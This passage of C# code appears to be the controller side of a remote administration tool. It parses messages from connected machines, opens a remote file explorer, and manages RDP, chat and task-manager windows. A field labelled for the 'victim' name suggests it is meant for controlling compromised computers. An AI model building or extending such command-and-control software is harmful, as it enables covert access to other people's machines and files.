                                error_log_file(ex.ToString());
                                fle_explr_frm._err("can't open file\\folder!");
                            }


                        }
                    }
                    else if (string_recv.StartsWith("client_recv_sub_main_files;"))
                    {
                        string sub_it = string_recv.Substring("client_recv_sub_main_files;".Length);
                        if (sub_it.Contains("err"))
                        {
                            fle_explr_frm._err("can't open file\\folder!");
                        }
                        else
                        {
                            string[] tags = sub_it.Split('\n');
                            string files = tags[1];
                            try
                            {
                                JObject files_obj = JObject.Parse(files);
                                fle_explr_frm.load_files(files_obj);

                            }
                            catch (Exception ex)
                            {
                                error_log_file(ex.ToString());
                                fle_explr_frm._err("can't open file\\folder!");
                            }
                        }
                    }
                    else if (string_recv.StartsWith("client_recv_sub_files;"))
                    {
                        string sub_it = string_recv.Substring("client_recv_sub_files;".Length);
                        if (sub_it.Contains("err"))
                        {
                            fle_explr_frm._err("can't open file\\folder!");
                        }
                        else
                        {
                            string[] tags = sub_it.Split('\n');
                            string files = tags[1];
                            try
                            {
                                JObject files_obj = JObject.Parse(files);
                                fle_explr_frm.load_files(files_obj);

                            }
                            catch (Exception ex)
                            {
                                error_log_file(ex.ToString());
                                fle_explr_frm._err("can't open file\\folder!");
                            }
                        }
                    }
                    else if (string_recv.StartsWith("main_dirs;"))
                    {
                        string remove_tag = string_recv.Substring(11);
                        string[] info_array = remove_tag.Split('\n');
                        client_windows_username = info_array[0];
                        client_pc_name = info_array[1];
                        client_win_main_dir = info_array[2];
                        client_MAIN_DISK = client_win_main_dir.Split('\\')[0];


                        client_username_main_dir = client_username_main_dir.Replace("#client_main_disk", client_MAIN_DISK);
                        client_username_main_dir = client_username_main_dir.Replace("#client_username", client_windows_username);
                        fle_explr_frm = new FileExplorer(client_socket, this, client_username_main_dir);
                        fle_explr_frm.victm_name = dataGridView1.Rows[this.selected_client_index].Cells["_PC_NAME"].Value.ToString();
                        send_to_client(client_socket, $"start_fileexplorer;\n{client_username_main_dir}");
                        fle_explr_frm._MAIN_DISKS = client_ALL_DISK.Split('\n');
                        new Thread(new ThreadStart(new Action(() =>
                        {
                            fle_explr_frm.ShowDialog();
                        }))).Start();
                    }

                    GC.Collect();//Collect to not fill memory

                }
            }

            catch (Exception ex)
            {
                error_log_file(ex.ToString());
            }

            try
            {
                if (!SocketConnected(client_socket))
                {
                    Thread.Sleep(500);
                    try
                    {
                        client_socket.Disconnect(false);
                    }catch(Exception ex)
                    {
                        error_log_file(ex.ToString());
                    }
                    try
                    {
                        client_socket.Close();
                    }catch(Exception ex)
                    {
                        error_log_file(ex.ToString());
                    }
                    if (doesgetinfo)
                    {
                      remove_client_and_grid(client_socket, index_of_row);
                    }
                    
                }
                else
                {
                    goto _start;
                }
                connections_label.Invoke(new MethodInvoker(() => { connections_label.Text = $"Connections [ {clients_sockets.Count} ]"; }));

            }
            catch (Exception ex)
            {
                error_log_file(ex.ToString());
            }


            GC.Collect();//Collect to not fill memory

            try
            {

                if (SocketConnected(client_socket)) //Last Check!
                {
                    goto _start;
                }
                Invoke(new MethodInvoker(() => {
                    if (rdp != null)
                    {
                        rdp.Close();
                        rdp.Dispose();
                    }

                    if (fle_explr_frm != null)
                    {
                        fle_explr_frm.Close();
                        fle_explr_frm.Dispose();
                    }

                    if (cht_frm != null)
                    {
                        cht_frm.Close();
                        cht_frm.Dispose();
                    }
                    if (tsk_mgr_form != null)
                    {
                        tsk_mgr_form.Close();
                        tsk_mgr_form.Dispose();
                    }
                }));
               
            }catch(Exception ex)
            {
                error_log_file(ex.ToString());
            }
            AllDisconn++;
        }

        private void startServer()
        {


            listener.Bind(endPoint);
            listener.Listen(0x10);/* 16 backlog */
            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add("log: create listener socket was good"); }));
            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: listener AF = {listener.AddressFamily};"); }));
            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: listener Protocol = {listener.ProtocolType};"); }));
            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add("log: listener socket Bind(); was good"); }));
            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add("log: listener socket Listen(); was good"); }));
            socket_label.Invoke(new MethodInvoker(() =>
            {
                socket_label.Text = "SOCKET_FD [OK]";
            }));
            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add("log: listener/server start Accept"); }));

            for(; ; )
            {
            
                Socket client_socket = listener.Accept();
                clients_sockets.Add(client_socket);
      
                Thread thd = new Thread(new ThreadStart(new Action(() => { dealing_with_the_client(client_socket); })));
                thd.Name = $"dealing_with_the_client {AllConn}";
                AllConn++;
                thd.Start();
                clients_threads.Add(thd);
                GC.Collect();
            }
        }



        /* END server functions */
        #endregion

   
    }      
}